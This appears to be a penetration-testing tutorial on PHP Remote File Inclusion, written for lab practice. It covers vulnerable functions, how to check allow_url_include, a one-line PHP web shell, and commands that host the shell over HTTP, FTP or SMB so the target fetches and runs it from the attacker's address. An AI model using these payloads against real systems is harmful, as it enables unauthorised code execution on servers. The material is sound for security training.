# Remote File Inclusion (RFI)

**Remote File Inclusion (RFI)** is a vulnerability that allows an attacker to include remote files in a web application. This can lead to significant security risks, including remote code execution. Here’s a summary of key points and code examples related to RFI.

***

### 🔍 Local vs. Remote File Inclusion

RFI occurs when a vulnerable function allows the inclusion of remote files. This can be exploited to execute malicious scripts hosted by the attacker. The following functions can be vulnerable to RFI:

| Function                  | Read Content | Execute | Remote URL |
| ------------------------- | ------------ | ------- | ---------- |
| **PHP**                   |              |         |            |
| include()/include\_once() | ✅            | ✅       | ✅          |
| file\_get\_contents()     | ✅            | ❌       | ✅          |
| **Java**                  |              |         |            |
| import                    | ✅            | ✅       | ✅          |
| **.NET**                  |              |         |            |
| @Html.RemotePartial()     | ✅            | ❌       | ✅          |
| include                   | ✅            | ✅       | ✅          |

#### Key Differences

* **RFI** allows including remote files, while **LFI** only allows local files.
* RFI may not be possible if the function does not permit remote URLs or if server configurations block it.

***

### ✅ Verifying RFI Vulnerability

To check if a web application is vulnerable to RFI, we can look for the `allow_url_include` setting in PHP. This can be done using LFI techniques:

{% code overflow="wrap" %}
```bash
echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_include
```
{% endcode %}

If the output shows `allow_url_include = On`, we can proceed to test for RFI by attempting to include a local URL:

{% code overflow="wrap" %}
```bash
http://<SERVER_IP>:<PORT>/index.php?language=http://127.0.0.1:80/index.php
```
{% endcode %}

If the page is included and executed, the application is vulnerable to RFI.

***

### ⚙️ Remote Code Execution with RFI

To gain remote code execution, we need to create a malicious script. For example, a simple PHP web shell can be created as follows:

```bash
bashCopy Codeecho '<?php system($_GET["cmd"]); ?>' > shell.php
```

#### Hosting the Script

**Using HTTP**

Start a simple HTTP server using Python:

```bash
bashCopy Codesudo python3 -m http.server <LISTENING_PORT>
```

Then, include the shell script via RFI:

{% code overflow="wrap" %}
```bash
http://<SERVER_IP>:<PORT>/index.php?language=http://<OUR_IP>:<LISTENING_PORT>/shell.php&cmd=id
```
{% endcode %}

**Using FTP**

Alternatively, host the script using an FTP server:

```bash
sudo python -m pyftpdlib -p 21
```

Include the script using the FTP protocol:

```bash
http://<SERVER_IP>:<PORT>/index.php?language=ftp://<OUR_IP>/shell.php&cmd=id
```

**Using SMB**

If the target is a Windows server, we can use SMB for RFI:

```bash
impacket-smbserver -smb2support share $(pwd)
```

Include the script using a UNC path:

```bash
http://<SERVER_IP>:<PORT>/index.php?language=\\<OUR_IP>\share\shell.php&cmd=whoami
```

#### Important Notes

* Ensure that the server is on the same network for SMB to work effectively.
* Be cautious of firewalls that may block HTTP or FTP requests.

***

\
